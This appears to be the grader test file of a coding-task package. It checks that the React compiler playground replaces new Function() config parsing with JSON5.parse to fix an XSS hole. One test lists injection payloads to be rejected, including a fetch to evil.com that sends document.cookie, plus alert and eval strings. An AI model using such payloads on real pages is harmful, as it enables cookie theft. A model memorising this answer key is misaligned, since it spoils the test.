"""
Task: react-playground-json5-config
Repo: react @ 74568e8627aa43469b74f2972f427a209639d0b6
PR:   36159

All checks must pass for reward = 1. Any failure = reward 0.
Each test function maps 1:1 to a check in eval_manifest.yaml.
"""

import subprocess
from pathlib import Path

REPO = "/workspace/react"
PLAYGROUND = f"{REPO}/compiler/apps/playground"
COMPILER = f"{REPO}/compiler"
BABEL_PLUGIN = f"{COMPILER}/packages/babel-plugin-react-compiler"


def _ensure_compiler_deps():
    """Install compiler dependencies if not already installed."""
    if not Path(f"{COMPILER}/node_modules/.bin/eslint").exists():
        subprocess.run(
            ["yarn", "install", "--frozen-lockfile", "--network-concurrency", "1"],
            cwd=COMPILER,
            capture_output=True,
            timeout=300,
        )


# ---------------------------------------------------------------------------
# Pass-to-pass (repo_tests) — CI/CD verification tests
# These ensure the fix doesn't break existing functionality.
# ---------------------------------------------------------------------------


def test_repo_babel_plugin_eslint():
    """Repo's babel-plugin-react-compiler ESLint passes (pass_to_pass)."""
    _ensure_compiler_deps()
    r = subprocess.run(
        ["./node_modules/.bin/eslint", "packages/babel-plugin-react-compiler/src", "--ext", ".ts"],
        capture_output=True, text=True, timeout=120, cwd=COMPILER,
    )
    assert r.returncode == 0, f"ESLint failed:\n{r.stderr[-500:]}{r.stdout[-500:]}"


def test_repo_babel_plugin_unit_tests():
    """Repo's babel-plugin-react-compiler unit tests pass (pass_to_pass)."""
    _ensure_compiler_deps()
    r = subprocess.run(
        ["./node_modules/.bin/jest",
         "--testPathPattern=Result-test|envConfig-test|parseConfigPragma-test|DisjointSet-test|Logger-test",
         "--no-coverage"],
        capture_output=True, text=True, timeout=120, cwd=BABEL_PLUGIN,
    )
    assert r.returncode == 0, f"Unit tests failed:\n{r.stderr[-500:]}{r.stdout[-500:]}"


def test_repo_eslint_plugin_tests():
    """Repo's eslint-plugin-react-compiler unit tests pass (pass_to_pass)."""
    _ensure_compiler_deps()
    r = subprocess.run(
        ["./node_modules/.bin/jest", "--no-coverage"],
        capture_output=True, text=True, timeout=120,
        cwd=f"{COMPILER}/packages/eslint-plugin-react-compiler",
    )
    assert r.returncode == 0, f"ESLint plugin tests failed:\n{r.stderr[-500:]}{r.stdout[-500:]}"


def test_repo_make_read_only_util_tests():
    """Repo's make-read-only-util unit tests pass (pass_to_pass)."""
    _ensure_compiler_deps()
    r = subprocess.run(
        ["./node_modules/.bin/jest", "--no-coverage"],
        capture_output=True, text=True, timeout=60,
        cwd=f"{COMPILER}/packages/make-read-only-util",
    )
    assert r.returncode == 0, f"make-read-only-util tests failed:\n{r.stderr[-500:]}{r.stdout[-500:]}"


def test_repo_babel_plugin_typescript_check():
    """Repo's babel-plugin-react-compiler TypeScript type check passes (pass_to_pass)."""
    _ensure_compiler_deps()
    r = subprocess.run(
        ["npx", "tsc", "--noEmit"],
        capture_output=True, text=True, timeout=120,
        cwd=BABEL_PLUGIN,
    )
    assert r.returncode == 0, f"TypeScript check failed:\n{r.stderr[-500:]}{r.stdout[-500:]}"


def test_repo_react_compiler_runtime_typescript_check():
    """Repo's react-compiler-runtime TypeScript type check passes (pass_to_pass)."""
    _ensure_compiler_deps()
    r = subprocess.run(
        ["npx", "tsc", "--noEmit"],
        capture_output=True, text=True, timeout=120,
        cwd=f"{COMPILER}/packages/react-compiler-runtime",
    )
    assert r.returncode == 0, f"TypeScript check failed:\n{r.stderr[-500:]}{r.stdout[-500:]}"


def test_repo_babel_plugin_build():
    """Repo's babel-plugin-react-compiler builds successfully (pass_to_pass)."""
    _ensure_compiler_deps()
    r = subprocess.run(
        ["yarn", "build"],
        capture_output=True, text=True, timeout=120, cwd=BABEL_PLUGIN,
    )
    assert r.returncode == 0, f"Build failed:\n{r.stderr[-500:]}{r.stdout[-500:]}"


# ---------------------------------------------------------------------------
# Fail-to-pass (pr_diff) — core behavioral tests
# ---------------------------------------------------------------------------


def test_parseConfigOverrides_test_suite():
    """PR's parseConfigOverrides unit tests pass via node --test."""
    test_file = Path(f"{PLAYGROUND}/__tests__/parseConfigOverrides.test.mjs")
    assert test_file.exists(), (
        "parseConfigOverrides.test.mjs should exist"
    )
    r = subprocess.run(
        ["node", "--test", str(test_file)],
        cwd=PLAYGROUND,
        capture_output=True,
        timeout=30,
    )
    assert r.returncode == 0, (
        f"parseConfigOverrides tests failed:\n"
        f"{r.stdout.decode()}\n{r.stderr.decode()}"
    )


def test_json5_parses_playground_configs():
    """JSON5 correctly parses config formats used by the playground editor."""
    compilation = Path(f"{PLAYGROUND}/lib/compilation.ts").read_text()
    assert "JSON5.parse" in compilation, (
        "compilation.ts should use JSON5.parse for config parsing"
    )

    script = """
const JSON5 = require('json5');
const assert = require('assert');

const tests = [
    // [input, expected]
    ['{}', {}],
    ['{ compilationMode: "all" }', {compilationMode: 'all'}],
    ['{ compilationMode: "all", }', {compilationMode: 'all'}],
    ['{ //compilationMode: "all"\\n}', {}],
    ['{ /* comment */ compilationMode: "all" }', {compilationMode: 'all'}],
    ['{ environment: { validateRefAccessDuringRender: true } }',
     {environment: {validateRefAccessDuringRender: true}}],
    ['{ compilationMode: "all", environment: { validateRefAccessDuringRender: false } }',
     {compilationMode: 'all', environment: {validateRefAccessDuringRender: false}}],
    ['{ sources: ["src/a.ts", "src/b.ts"] }',
     {sources: ['src/a.ts', 'src/b.ts']}],
    ['{ maxLevel: 42 }', {maxLevel: 42}],
    ['{ compilationMode: null }', {compilationMode: null}],
];

for (const [input, expected] of tests) {
    const result = JSON5.parse(input);
    assert.deepStrictEqual(result, expected, 'Failed for: ' + input);
}
console.log('All JSON5 parsing tests passed');
"""
    r = subprocess.run(
        ["node", "-e", script],
        cwd=REPO,
        capture_output=True,
        timeout=15,
    )
    assert r.returncode == 0, (
        f"JSON5 config parsing failed:\n{r.stderr.decode()}"
    )


def test_json5_blocks_code_injection():
    """JSON5 parsing rejects malicious JS that new Function() would execute."""
    compilation = Path(f"{PLAYGROUND}/lib/compilation.ts").read_text()
    assert "JSON5.parse" in compilation, (
        "compilation.ts should use JSON5.parse for config parsing"
    )

    script = r"""
const JSON5 = require('json5');
const assert = require('assert');

const malicious = [
    '(function(){ document.title = "hacked"; return {}; })()',
    '{ compilationMode: (alert("xss"), "all") }',
    '{ compilationMode: eval("all") }',
    '{ compilationMode: someVar }',
    'fetch("https://evil.com?c=" + document.cookie)',
    '{ compilationMode: new String("all") }',
    '{ compilationMode: `all` }',
];

for (const input of malicious) {
    assert.throws(
        () => JSON5.parse(input),
        undefined,
        'Should reject malicious input: ' + input,
    );
}
console.log('All XSS rejection tests passed');
"""
    r = subprocess.run(
        ["node", "-e", script],
        cwd=REPO,
        capture_output=True,
        timeout=15,
    )
    assert r.returncode == 0, (
        f"XSS rejection tests failed:\n{r.stderr.decode()}"
    )


# ---------------------------------------------------------------------------
# Fail-to-pass (pr_diff) — source-level checks
# ---------------------------------------------------------------------------


def test_xss_vulnerability_removed():
    """compilation.ts uses JSON5 import and exported parseConfigOverrides, not new Function."""
    src = Path(f"{PLAYGROUND}/lib/compilation.ts").read_text()

    # Must import JSON5
    assert "import JSON5 from" in src or "import JSON5 from" in src.replace("'", '"'), (
        "compilation.ts should import JSON5"
    )

    # Must export parseConfigOverrides
    assert "export function parseConfigOverrides" in src, (
        "compilation.ts should export parseConfigOverrides"
    )

    # Must NOT use new Function for config parsing (the XSS vulnerability)
    assert "new Function" not in src, (
        "compilation.ts should not use new Function (XSS vulnerability)"
    )

    # Must use parseConfigOverrides in parseOptions
    assert "parseConfigOverrides(configOverrides)" in src or "parseConfigOverrides(" in src, (
        "parseOptions should call parseConfigOverrides"
    )


def test_config_format_migrated_to_json5():
    """Default config and editor updated from TypeScript format to JSON5."""
    # defaultStore.ts: no more TypeScript wrappers
    default_store = Path(f"{PLAYGROUND}/lib/defaultStore.ts").read_text()
    assert "satisfies PluginOptions" not in default_store, (
        "Default config should not use TypeScript 'satisfies' wrapper"
    )
    assert "import type { PluginOptions }" not in default_store, (
        "Default config should not have PluginOptions import"
    )

    # ConfigEditor.tsx: JSON language mode instead of TypeScript
    config_editor = Path(f"{PLAYGROUND}/components/Editor/ConfigEditor.tsx").read_text()
    assert "language={'json'}" in config_editor or 'language="json"' in config_editor, (
        "Config editor should use JSON language mode"
    )
    assert "language={'typescript'}" not in config_editor, (
        "Config editor should not use TypeScript language mode for config"
    )

    # package.json: json5 dependency declared
    import json
    pkg = json.loads(Path(f"{PLAYGROUND}/package.json").read_text())
    deps = pkg.get("dependencies", {})
    assert "json5" in deps, (
        "json5 should be declared as a dependency in playground package.json"
    )


# === CI-mined tests (taskforge.ci_check_miner) ===
def test_ci_jest_babel_plugin_react_compil_yarn():
    """pass_to_pass | CI job 'Jest babel-plugin-react-compiler' -> step ''"""
    r = subprocess.run(
        ["bash", "-lc", 'yarn install --frozen-lockfile'], cwd=REPO,
        capture_output=True, text=True, timeout=300)
    assert r.returncode == 0, (
        f"CI step '' failed (returncode={r.returncode}):\n"
        f"stdout: {r.stdout[-1500:]}\nstderr: {r.stderr[-1500:]}")


def test_ci_check_license_scripts_ci_check_license_sh():
    """pass_to_pass | CI job 'Check license' -> step ''"""
    r = subprocess.run(
        ["bash", "-lc", './scripts/ci/check_license.sh'], cwd=REPO,
        capture_output=True, text=True, timeout=300)
    assert r.returncode == 0, (
        f"CI step '' failed (returncode={r.returncode}):\n"
        f"stdout: {r.stdout[-1500:]}\nstderr: {r.stderr[-1500:]}")


def test_ci_test_print_warnings_scripts_ci_test_print_warnings_sh():
    """pass_to_pass | CI job 'Test print warnings' -> step ''"""
    r = subprocess.run(
        ["bash", "-lc", './scripts/ci/test_print_warnings.sh'], cwd=REPO,
        capture_output=True, text=True, timeout=300)
    assert r.returncode == 0, (
        f"CI step '' failed (returncode={r.returncode}):\n"
        f"stdout: {r.stdout[-1500:]}\nstderr: {r.stderr[-1500:]}")


def test_ci_test_playground_npx():
    """pass_to_pass | CI job 'Test playground' -> step ''"""
    r = subprocess.run(
        ["bash", "-lc", 'npx playwright install --with-deps chromium'], cwd=REPO,
        capture_output=True, text=True, timeout=300)
    assert r.returncode == 0, (
        f"CI step '' failed (returncode={r.returncode}):\n"
        f"stdout: {r.stdout[-1500:]}\nstderr: {r.stderr[-1500:]}")


def test_ci_test_eslint_plugin_react_hooks_scripts_react_compiler_build_compiler_sh():
    """pass_to_pass | CI job 'Test eslint-plugin-react-hooks' -> step ''"""
    r = subprocess.run(
        ["bash", "-lc", './scripts/react-compiler/build-compiler.sh && ./scripts/react-compiler/link-compiler.sh'], cwd=REPO,
        capture_output=True, text=True, timeout=300)
    assert r.returncode == 0, (
        f"CI step '' failed (returncode={r.returncode}):\n"
        f"stdout: {r.stdout[-1500:]}\nstderr: {r.stderr[-1500:]}")


def test_ci_test_eslint_plugin_react_hooks_yarn():
    """pass_to_pass | CI job 'Test eslint-plugin-react-hooks' -> step ''"""
    r = subprocess.run(
        ["bash", "-lc", 'yarn workspace eslint-plugin-react-hooks test'], cwd=REPO,
        capture_output=True, text=True, timeout=300)
    assert r.returncode == 0, (
        f"CI step '' failed (returncode={r.returncode}):\n"
        f"stdout: {r.stdout[-1500:]}\nstderr: {r.stderr[-1500:]}")


def test_ci_yarn_build_and_lint_yarn():
    """pass_to_pass | CI job 'yarn build and lint' -> step ''"""
    r = subprocess.run(
        ["bash", "-lc", 'yarn --cwd compiler install --frozen-lockfile'], cwd=REPO,
        capture_output=True, text=True, timeout=300)
    assert r.returncode == 0, (
        f"CI step '' failed (returncode={r.returncode}):\n"
        f"stdout: {r.stdout[-1500:]}\nstderr: {r.stderr[-1500:]}")


def test_ci_yarn_build_and_lint_lint_build():
    """pass_to_pass | CI job 'yarn build and lint' -> step 'Lint build'"""
    r = subprocess.run(
        ["bash", "-lc", 'yarn lint-build'], cwd=REPO,
        capture_output=True, text=True, timeout=300)
    assert r.returncode == 0, (
        f"CI step 'Lint build' failed (returncode={r.returncode}):\n"
        f"stdout: {r.stdout[-1500:]}\nstderr: {r.stderr[-1500:]}")
